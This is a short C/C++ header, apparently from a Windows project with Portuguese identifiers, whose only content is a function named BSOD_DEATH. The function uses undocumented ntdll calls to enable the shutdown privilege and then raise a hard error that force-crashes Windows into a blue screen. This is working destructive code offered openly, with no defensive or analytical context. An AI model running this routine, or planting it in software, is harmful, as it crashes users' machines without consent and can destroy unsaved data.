#pragma once
#include "pch.h"
#include "Windows.h"
#include "Winternl.h"
#include "BsodAlg.h"

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void BSOD_DEATH(void) {
	BOOLEAN habilitado;
	ULONG Resposta;
	LPVOID lpEnderecoFuncao_1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpEnderecoFuncao_2 = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpEnderecoFuncao_1;
	pdef_NtRaiseHardError NtCall_2 = (pdef_NtRaiseHardError)lpEnderecoFuncao_2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &habilitado);
	NtCall_2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &Resposta);
}